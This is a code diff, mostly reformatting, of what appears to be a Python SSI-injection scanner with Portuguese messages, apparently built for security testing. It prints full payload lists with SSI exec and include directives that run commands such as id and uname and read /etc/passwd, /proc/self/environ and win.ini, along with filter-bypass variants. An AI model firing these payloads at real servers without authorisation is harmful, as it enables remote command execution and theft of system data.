@@ -14,6 +14,7 @@ Fluxo:
   4. Classifica: detectado, blocked, error
   5. Retorna resultado consolidado com severidade
 """
+
 import argparse
 import asyncio
 import logging
@@ -48,22 +49,22 @@ _CATEGORY_MAP: dict[str, list[str]] = {
 _DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
         "basic_echo",
-        "<!--#echo var=\"DOCUMENT_ROOT\"-->",
+        '<!--#echo var="DOCUMENT_ROOT"-->',
         ["var=", "DOCUMENT_ROOT", "/var/www", "/home"],
     ),
     (
         "basic_exec",
-        "<!--#exec cmd=\"id\"-->",
+        '<!--#exec cmd="id"-->',
         ["uid=", "gid=", "groups="],
     ),
     (
         "basic_include",
-        "<!--#include file=\"/etc/passwd\"-->",
+        '<!--#include file="/etc/passwd"-->',
         ["root:", "/bin/bash", "/bin/sh"],
     ),
     (
         "basic_config",
-        "<!--#config timefmt=\"%s\"-->",
+        '<!--#config timefmt="%s"-->',
         ["config", "timefmt"],
     ),
     (
@@ -76,27 +77,27 @@ _DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
 _RCE_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
         "exec_whoami",
-        "<!--#exec cmd=\"whoami\"-->",
+        '<!--#exec cmd="whoami"-->',
         ["www-data", "apache", "nginx", "root", "nobody"],
     ),
     (
         "exec_id",
-        "<!--#exec cmd=\"id\"-->",
+        '<!--#exec cmd="id"-->',
         ["uid=", "gid=", "groups="],
     ),
     (
         "exec_ls",
-        "<!--#exec cmd=\"ls /\"-->",
+        '<!--#exec cmd="ls /"-->',
         ["bin", "etc", "home", "var", "usr"],
     ),
     (
         "exec_cat",
-        "<!--#exec cmd=\"cat /etc/hostname\"-->",
+        '<!--#exec cmd="cat /etc/hostname"-->',
         ["hostname", "localhost"],
     ),
     (
         "exec_uname",
-        "<!--#exec cmd=\"uname -a\"-->",
+        '<!--#exec cmd="uname -a"-->',
         ["linux", "Linux", "GNU", "kernel"],
     ),
 ]
@@ -104,27 +105,27 @@ _RCE_PAYLOADS: list[tuple[str, str, list[str]]] = [
 _FILE_READ_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
         "include_passwd",
-        "<!--#include file=\"/etc/passwd\"-->",
+        '<!--#include file="/etc/passwd"-->',
         ["root:", "daemon:", "/bin/bash"],
     ),
     (
         "include_hosts",
-        "<!--#include file=\"/etc/hosts\"-->",
+        '<!--#include file="/etc/hosts"-->',
         ["localhost", "127.0.0.1"],
     ),
     (
         "include_etc",
-        "<!--#exec cmd=\"cat /etc/passwd\"-->",
+        '<!--#exec cmd="cat /etc/passwd"-->',
         ["root:", "daemon:", "/bin/bash"],
     ),
     (
         "include_proc",
-        "<!--#exec cmd=\"cat /proc/self/environ\"-->",
+        '<!--#exec cmd="cat /proc/self/environ"-->',
         ["PATH=", "SERVER_NAME=", "DOCUMENT_ROOT="],
     ),
     (
         "include_iis",
-        "<!--#include file=\"C:\\Windows\\win.ini\"-->",
+        '<!--#include file="C:\\Windows\\win.ini"-->',
         ["[fonts]", "[extensions]"],
     ),
 ]
@@ -132,31 +133,31 @@ _FILE_READ_PAYLOADS: list[tuple[str, str, list[str]]] = [
 _BLIND_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     (
         "blind_sleep",
-        "<!--#exec cmd=\"sleep 2\"-->",
+        '<!--#exec cmd="sleep 2"-->',
         "time",
         ["response"],
     ),
     (
         "blind_expr",
-        "<!--#exec cmd=\"expr 1 + 1\"-->",
+        '<!--#exec cmd="expr 1 + 1"-->',
         "content",
         ["2"],
     ),
     (
         "blind_len",
-        "<!--#exec cmd=\"echo -n abc | wc -c\"-->",
+        '<!--#exec cmd="echo -n abc | wc -c"-->',
         "content",
         ["3"],
     ),
     (
         "blind_md5",
-        "<!--#exec cmd=\"echo -n test | md5sum\"-->",
+        '<!--#exec cmd="echo -n test | md5sum"-->',
         "content",
         ["098f6bcd4621d373cade4e832627b4f6"],
     ),
     (
         "blind_hash",
-        "<!--#exec cmd=\"echo test | sha1sum\"-->",
+        '<!--#exec cmd="echo test | sha1sum"-->',
         "content",
         ["a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"],
     ),
@@ -175,25 +176,37 @@ _BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
     ),
     (
         "null_byte",
-        "<!--#exec cmd=\"id\"%00-->",
+        '<!--#exec cmd="id"%00-->',
         ["uid=", "gid="],
     ),
     (
         "case_variation",
-        "<!--#EXEC CMD=\"id\"-->",
+        '<!--#EXEC CMD="id"-->',
         ["uid=", "gid="],
     ),
     (
         "nesting",
-        "<!--#exec cmd=\"cat /etc/passwd\" -->",
+        '<!--#exec cmd="cat /etc/passwd" -->',
         ["root:", "/bin/bash"],
     ),
 ]
 
 _SSI_PARAMS: list[str] = [
-    "user", "username", "search", "comment", "name",
-    "query", "input", "text", "message", "data",
-    "page", "file", "path", "template", "include",
+    "user",
+    "username",
+    "search",
+    "comment",
+    "name",
+    "query",
+    "input",
+    "text",
+    "message",
+    "data",
+    "page",
+    "file",
+    "path",
+    "template",
+    "include",
 ]
 
 
@@ -286,41 +299,45 @@ async def _test_detect(
                     status_changed = t_status != b_status
                     vulnerable = _check_ssi_response(resp.content, t_status, indicators)
 
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="detect",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=t_status,
-                        size_baseline=b_size,
-                        size_test=t_size,
-                        status_changed=status_changed,
-                        size_changed=abs(t_size - b_size) > 50,
-                        vulnerable=vulnerable,
-                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-                        error="",
-                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
-                        tool="curl",
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="detect",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=t_status,
+                            size_baseline=b_size,
+                            size_test=t_size,
+                            status_changed=status_changed,
+                            size_changed=abs(t_size - b_size) > 50,
+                            vulnerable=vulnerable,
+                            details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                            error="",
+                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
+                            tool="curl",
+                        )
+                    )
                 except httpx.RequestError as exc:
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="detect",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(exc),
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="detect",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=0,
+                            size_baseline=b_size,
+                            size_test=0,
+                            status_changed=False,
+                            size_changed=False,
+                            vulnerable=False,
+                            details="",
+                            error=str(exc),
+                        )
+                    )
 
     return attempts
 
@@ -356,41 +373,45 @@ async def _test_rce(
                     status_changed = t_status != b_status
                     vulnerable = _check_ssi_response(resp.content, t_status, indicators)
 
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="rce",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=t_status,
-                        size_baseline=b_size,
-                        size_test=t_size,
-                        status_changed=status_changed,
-                        size_changed=abs(t_size - b_size) > 50,
-                        vulnerable=vulnerable,
-                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-                        error="",
-                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
-                        tool="curl",
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="rce",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=t_status,
+                            size_baseline=b_size,
+                            size_test=t_size,
+                            status_changed=status_changed,
+                            size_changed=abs(t_size - b_size) > 50,
+                            vulnerable=vulnerable,
+                            details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                            error="",
+                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
+                            tool="curl",
+                        )
+                    )
                 except httpx.RequestError as exc:
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="rce",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(exc),
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="rce",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=0,
+                            size_baseline=b_size,
+                            size_test=0,
+                            status_changed=False,
+                            size_changed=False,
+                            vulnerable=False,
+                            details="",
+                            error=str(exc),
+                        )
+                    )
 
     return attempts
 
@@ -426,41 +447,45 @@ async def _test_file_read(
                     status_changed = t_status != b_status
                     vulnerable = _check_ssi_response(resp.content, t_status, indicators)
 
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="file_read",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=t_status,
-                        size_baseline=b_size,
-                        size_test=t_size,
-                        status_changed=status_changed,
-                        size_changed=abs(t_size - b_size) > 50,
-                        vulnerable=vulnerable,
-                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-                        error="",
-                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
-                        tool="curl",
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="file_read",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=t_status,
+                            size_baseline=b_size,
+                            size_test=t_size,
+                            status_changed=status_changed,
+                            size_changed=abs(t_size - b_size) > 50,
+                            vulnerable=vulnerable,
+                            details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                            error="",
+                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
+                            tool="curl",
+                        )
+                    )
                 except httpx.RequestError as exc:
-                    attempts.append(SSIiAttempt(
-                        technique=f"{technique}_{param}",
-                        category="file_read",
-                        payload=payload,
-                        param=param,
-                        method=method,
-                        status_baseline=b_status,
-                        status_test=0,
-                        size_baseline=b_size,
-                        size_test=0,
-                        status_changed=False,
-                        size_changed=False,
-                        vulnerable=False,
-                        details="",
-                        error=str(exc),
-                    ))
+                    attempts.append(
+                        SSIiAttempt(
+                            technique=f"{technique}_{param}",
+                            category="file_read",
+                            payload=payload,
+                            param=param,
+                            method=method,
+                            status_baseline=b_status,
+                            status_test=0,
+                            size_baseline=b_size,
+                            size_test=0,
+                            status_changed=False,
+                            size_changed=False,
+                            vulnerable=False,
+                            details="",
+                            error=str(exc),
+                        )
+                    )
 
     return attempts
 
@@ -501,41 +526,45 @@ async def _test_blind(
                 else:
                     details = "Sem mudanca"
 
-                attempts.append(SSIiAttempt(
-                    technique=f"{technique}_{param}",
-                    category="blind",
-                    payload=payload,
-                    param=param,
-                    method="query",
-                    status_baseline=b_status,
-                    status_test=t_status,
-                    size_baseline=b_size,
-                    size_test=t_size,
-                    status_changed=status_changed,
-                    size_changed=abs(t_size - b_size) > 50,
-                    vulnerable=vulnerable,
-                    details=details,
-                    error="",
-                    exploit="<!--#exec cmd='id'-->" if vulnerable else "",
-                    tool="curl",
-                ))
+                attempts.append(
+                    SSIiAttempt(
+                        technique=f"{technique}_{param}",
+                        category="blind",
+                        payload=payload,
+                        param=param,
+                        method="query",
+                        status_baseline=b_status,
+                        status_test=t_status,
+                        size_baseline=b_size,
+                        size_test=t_size,
+                        status_changed=status_changed,
+                        size_changed=abs(t_size - b_size) > 50,
+                        vulnerable=vulnerable,
+                        details=details,
+                        error="",
+                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
+                        tool="curl",
+                    )
+                )
             except httpx.RequestError as exc:
-                attempts.append(SSIiAttempt(
-                    technique=f"{technique}_{param}",
-                    category="blind",
-                    payload=payload,
-                    param=param,
-                    method="query",
-                    status_baseline=b_status,
-                    status_test=0,
-                    size_baseline=b_size,
-                    size_test=0,
-                    status_changed=False,
-                    size_changed=False,
-                    vulnerable=False,
-                    details="",
-                    error=str(exc),
-                ))
+                attempts.append(
+                    SSIiAttempt(
+                        technique=f"{technique}_{param}",
+                        category="blind",
+                        payload=payload,
+                        param=param,
+                        method="query",
+                        status_baseline=b_status,
+                        status_test=0,
+                        size_baseline=b_size,
+                        size_test=0,
+                        status_changed=False,
+                        size_changed=False,
+                        vulnerable=False,
+                        details="",
+                        error=str(exc),
+                    )
+                )
 
     return attempts
 
@@ -563,41 +592,45 @@ async def _test_bypass(
                 status_changed = t_status != b_status
                 vulnerable = _check_ssi_response(resp.content, t_status, indicators)
 
-                attempts.append(SSIiAttempt(
-                    technique=f"{technique}_{param}",
-                    category="bypass",
-                    payload=payload,
-                    param=param,
-                    method="post_form",
-                    status_baseline=b_status,
-                    status_test=t_status,
-                    size_baseline=b_size,
-                    size_test=t_size,
-                    status_changed=status_changed,
-                    size_changed=abs(t_size - b_size) > 50,
-                    vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-                    error="",
-                    exploit="<!--#exec cmd='id'-->" if vulnerable else "",
-                    tool="curl",
-                ))
+                attempts.append(
+                    SSIiAttempt(
+                        technique=f"{technique}_{param}",
+                        category="bypass",
+                        payload=payload,
+                        param=param,
+                        method="post_form",
+                        status_baseline=b_status,
+                        status_test=t_status,
+                        size_baseline=b_size,
+                        size_test=t_size,
+                        status_changed=status_changed,
+                        size_changed=abs(t_size - b_size) > 50,
+                        vulnerable=vulnerable,
+                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                        error="",
+                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
+                        tool="curl",
+                    )
+                )
             except httpx.RequestError as exc:
-                attempts.append(SSIiAttempt(
-                    technique=f"{technique}_{param}",
-                    category="bypass",
-                    payload=payload,
-                    param=param,
-                    method="post_form",
-                    status_baseline=b_status,
-                    status_test=0,
-                    size_baseline=b_size,
-                    size_test=0,
-                    status_changed=False,
-                    size_changed=False,
-                    vulnerable=False,
-                    details="",
-                    error=str(exc),
-                ))
+                attempts.append(
+                    SSIiAttempt(
+                        technique=f"{technique}_{param}",
+                        category="bypass",
+                        payload=payload,
+                        param=param,
+                        method="post_form",
+                        status_baseline=b_status,
+                        status_test=0,
+                        size_baseline=b_size,
+                        size_test=0,
+                        status_changed=False,
+                        size_changed=False,
+                        vulnerable=False,
+                        details="",
+                        error=str(exc),
+                    )
+                )
 
     return attempts
 
@@ -652,7 +685,6 @@ async def run_scan(
     tls = target.startswith("https")
     client = create_async_client(timeout=timeout)
     try:
-
         print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
         baseline = await _test_baseline(client, target)
         if baseline[0] == 0:
@@ -709,9 +741,9 @@ async def run_scan(
         logger.info("SSI scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
         return 1 if vuln_techs else 0
 
-
     finally:
         await client.aclose()
+
 
 banner_art = create_banner(
     r"""
@@ -735,7 +767,8 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("url", help="URL alvo (ex: https://example.com)")
     parser.add_argument(
-        "-c", "--category",
+        "-c",
+        "--category",
         choices=list(_CATEGORY_MAP.keys()),
         help="Categoria de testes (default: todas)",
     )
